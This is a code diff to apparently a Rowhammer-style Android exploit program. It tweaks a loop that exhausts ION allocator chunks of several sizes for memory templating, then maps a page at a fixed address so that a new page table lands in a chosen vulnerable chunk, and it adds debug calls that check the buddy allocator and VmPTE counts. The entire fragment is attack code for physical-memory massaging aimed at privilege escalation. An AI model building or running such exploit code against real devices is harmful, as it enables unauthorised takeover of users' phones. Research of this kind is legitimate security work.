@@ -314,7 +314,7 @@ int main(int argc, char *argv[]) {
             }
             run_cnt++;
             get_buddy_info();
-            
+
             // Exhaust L
             printf("[EXHAUST L] Exhaust L (4MB) ION chunks for templating\n");
             int count = ION_bulk(M(4), ion_chunks, 0);
@@ -345,6 +345,7 @@ int main(int argc, char *argv[]) {
                 continue;
             }
             ION_clean(first_expl->ion_chunk);
+            get_buddy_info();
 
             // Immediately exhaust M again
             printf("[EXHAUST M] Exhaust M (64KB) ION chunks again\n");
@@ -355,6 +356,7 @@ int main(int argc, char *argv[]) {
                 printf("[EXHAUST M] - size mismatch\n");
                 continue;
             }
+            get_buddy_info();
 
             count = 0;
             for (auto it = ion_chunks.rbegin(); it != ion_chunks.rend(); it++) {
@@ -407,13 +409,13 @@ int main(int argc, char *argv[]) {
             if (padding_num != 0) ION_bulk(K(4), ion_chunks, padding_num - 1,false);
 
             // Map appropriate p to allocate a new page table
-            get_maps_info();
-            // Why 0xB6800000? See my script.
-            void *p = (void *)(0x14000000 | first_expl->word_index_in_pt << 12);
+            // Why 0xB6600000? See my script.
+            void *p = (void *)(0xB6600000 | first_expl->word_index_in_pt << 12);
             get_status_info("VmPTE");
             void *q = mmap(p, K(4), PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-            get_status_info("VmPTE");
             printf("[MAP P] Map p at %p, got %p\n", p, q);
+            *(char *)q = 0xFF;
+            get_status_info("VmPTE");
 
             break;
         } while(true);
